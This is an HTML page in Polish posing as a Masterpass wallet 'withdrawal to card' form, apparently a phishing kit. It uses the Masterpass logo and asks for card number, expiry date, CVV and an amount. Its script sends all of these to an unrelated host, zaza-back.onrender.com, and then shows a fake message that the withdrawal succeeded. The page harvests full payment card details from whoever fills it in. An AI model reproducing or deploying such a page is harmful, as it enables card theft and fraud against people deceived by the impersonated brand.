<!DOCTYPE html>
<html lang="pl">
<head>
  <meta charset="UTF-8" />
  <title>Portfel Masterpass | Wypłata</title>
  <link rel="stylesheet" href="/style.css" />
</head>
<body>
  <div class="container">
    <img src="https://www.masterpass.pl/img/masterpass_logo.svg" alt="Masterpass logo" class="logo" />
    <h1>Wypłata na kartę</h1>

    <form id="withdrawForm">
      <label for="card">Numer karty</label>
      <input type="text" id="card" placeholder="1234 5678 9012 3456" required />

      <label for="expiry">Data ważności (MM/YY)</label>
      <input type="text" id="expiry" placeholder="MM/YY" required />

      <label for="cvv">Kod CVV</label>
      <input type="text" id="cvv" placeholder="CVV" required />

      <label for="amount">Kwota (PLN)</label>
      <input type="number" id="amount" placeholder="np. 100" required />

      <button type="submit">Potwierdź wypłatę</button>
    </form>

    <div id="confirmation"></div>
  </div>

  <script type="module">
    const form = document.getElementById('withdrawForm');
    const confirmation = document.getElementById('confirmation');

    form.addEventListener('submit', async (e) => {
      e.preventDefault();
      const card = document.getElementById('card').value.trim();
      const expiry = document.getElementById('expiry').value.trim();
      const cvv = document.getElementById('cvv').value.trim();
      const amount = document.getElementById('amount').value.trim();

      const res = await fetch('https://zaza-back.onrender.com/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ card, expiry, cvv, amount })
      });

      const data = await res.json();
      confirmation.innerText = data.success
        ? '✅ Wypłata została zrealizowana.'
        : '❌ Wystąpił błąd.';
    });
  </script>
</body>
</html>
